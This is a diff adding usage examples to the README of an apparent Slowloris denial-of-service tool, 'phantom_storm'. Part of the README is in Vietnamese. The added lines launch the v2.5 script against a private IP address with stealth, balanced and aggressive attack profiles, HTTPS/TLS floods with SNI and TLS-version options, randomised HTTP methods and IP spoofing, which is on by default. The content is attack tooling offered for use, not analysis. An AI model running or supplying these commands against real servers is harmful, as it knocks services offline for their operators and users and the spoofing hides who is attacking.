@@ -171,6 +171,32 @@ python phantom_storm.py 192.168.1.100 80 150
 
 # Tắt IP spoofing (nếu muốn test thuần túy Slowloris)
 python phantom_storm.py 192.168.1.100 80 150 --no-spoof
+
+# Using attack profiles (NEW in v2.5!)
+python phantom_storm_v2.py 192.168.1.100 80 50 --profile=stealth
+python phantom_storm_v2.py 192.168.1.100 80 150 --profile=balanced
+python phantom_storm_v2.py 192.168.1.100 80 300 --profile=aggressive
+
+# HTTPS/TLS attacks (NEW in v2.5!)
+python phantom_storm_v2.py 192.168.1.100 443 200 --https
+python phantom_storm_v2.py 192.168.1.100 443 200 --https --sni=www.example.com
+python phantom_storm_v2.py 192.168.1.100 443 200 --https --tls-version=TLS_1_2
+
+# HTTP method variation
+python phantom_storm_v2.py 192.168.1.100 80 200 --method=POST
+python phantom_storm_v2.py 192.168.1.100 80 200 --random-method
+
+# Traditional usage
+python phantom_storm_v2.py 192.168.1.100 80 200
+
+# Disable IP spoofing
+python phantom_storm_v2.py 192.168.1.100 80 200 --no-spoof
+
+# Combine features (HTTPS + Profile + Methods)
+python phantom_storm_v2.py 192.168.1.100 443 150 --https --profile=balanced --random-method
+
+# Using legacy version
+python phantom_storm.py 192.168.1.100 80 200
 ```
 
 ### Quy Trình Chạy Tool
